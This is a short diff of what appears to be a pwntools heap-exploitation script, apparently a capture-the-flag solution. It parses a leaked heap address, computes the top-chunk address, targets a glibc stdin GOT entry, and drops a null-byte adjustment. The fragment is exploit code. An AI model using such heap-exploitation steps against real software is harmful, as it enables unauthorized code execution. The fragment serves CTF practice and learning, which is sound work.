@@ -52,8 +52,6 @@ show_heap()
 r.recvuntil('a'*0x10)
 heap = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00'))
 top = heap + (0x1e14010 - 0x1df2030)
-if top < 0x602030: # that means there is a null byte (0x00) inside the address of top chunk
-    top += 0x10000000
 # print('top =', hex(top))
 
 glibc_stdin_got = 0x602030
